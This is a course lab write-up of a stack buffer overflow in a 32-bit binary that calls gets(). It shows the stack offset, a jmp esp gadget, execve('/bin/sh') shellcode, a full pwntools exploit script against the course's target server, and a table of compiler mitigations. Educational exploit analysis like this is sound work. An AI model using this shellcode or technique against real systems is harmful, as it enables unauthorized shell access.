# Technical Report: pwn2 – Stack Buffer Overflow / Shellcode Injection
 
**Course:** COSC 466/566 – Software and Web Security  
**Target:** `moa6.eecs.utk.edu:6055`
 
---
 
## 1. Binary Properties
 
```
ELF 32-bit LSB executable, Intel 80386, statically linked, not PIE, not stripped
```
 
- **No PIE** → code segment loads at fixed addresses every run; gadget addresses are deterministic
- **No NX** → stack is executable; shellcode injected onto the stack will run
- **No stack canary** → return address can be silently overwritten
---
 
## 2. Vulnerability
 
`gets(buffer)` in `main()` reads unbounded input into a **4-byte** stack buffer — a classic CWE-120 stack overflow. `gets()` was removed from C11 precisely because it cannot be used safely.
 
The binary also deliberately includes a `jmp *%esp` gadget inside `jump()` and leaks `print_jump_addr`'s address in the `else` branch, providing everything needed for a ret2shellcode attack.
 
---
 
## 3. Key Addresses (from `objdump -d`)
 
| Symbol | Address | Notes |
|--------|---------|-------|
| `jump()` | `0x804999a` | contains the gadget |
| **`jmp *%esp`** | **`0x80499a7`** | bytes `ff e4` — the ret2shellcode trampoline |
| `print_jump_addr` | `0x80499ac` | leaked by the binary; offset of 5 bytes from gadget |
 
---
 
## 4. Stack Layout & Offset
 
From `lea -0x8(%ebp),%eax` (the argument to `gets`), buffer starts at **EBP−8**:
 
```
[ EBP+4 ] return address   ← overwrite with 0x80499a7
[ EBP+0 ] saved EBP        ← 4 bytes
[ EBP-4 ] saved EBX        ← 4 bytes  (push %ebx in prologue)
[ EBP-8 ] buffer[4]        ← gets() writes here
```
 
**Padding to reach return address: 4 + 4 + 4 = 12 bytes**
 
---
 
## 5. Exploit
 
### Why `jmp esp` works
 
When `main()` executes `ret`:
1. `0x80499a7` is popped into EIP
2. ESP now points at the next word — the start of our shellcode
3. `jmp *%esp` redirects execution directly into the shellcode
No need to know the stack address; the trampoline resolves it automatically.
 
### Payload
 
```
[ 'A' × 12 ][ \xa7\x99\x49\x08 ][ shellcode (25 bytes) ]
  padding      jmp esp (LE)        execve("/bin/sh")
```
 
### Exploit Script
 
```python
from pwn import *
 
JMP_ESP   = 0x80499a7
SHELLCODE = b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x6e\x2f\x73\x68" \
            b"\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80"
 
PAYLOAD = b'A' * 12 + p32(JMP_ESP) + SHELLCODE
 
conn = remote('moa6.eecs.utk.edu', 6055)
conn.recvuntil(b'$ ')
conn.sendline(PAYLOAD)
conn.interactive()
```
 
### Execution Flow
 
1. `gets()` overflows buffer → overwrites saved EBX, saved EBP, and return address
2. `strcmp("AAAA...", "ls")` fails → else branch prints the hint (`0x80499ac`), confirming `jmp esp = hint − 5`
3. `printf("ByeByeBye!\n")` executes
4. `main()` returns → EIP = `0x80499a7` → `jmp esp` → shellcode → `/bin/sh`
5. `ls` and `cat flag.txt` retrieve the flag
---
 
## 6. Mitigations
 
| Fix | Effect |
|-----|--------|
| Replace `gets()` with `fgets(buf, sizeof(buf), stdin)` | Prevents overflow entirely |
| `-fstack-protector-strong` | Canary detects overwrite before ret |
| `-z noexecstack` (NX/DEP) | Shellcode on stack segfaults; requires ROP instead |
| `-pie -fPIC` + ASLR | Randomizes gadget address; leak would be required |
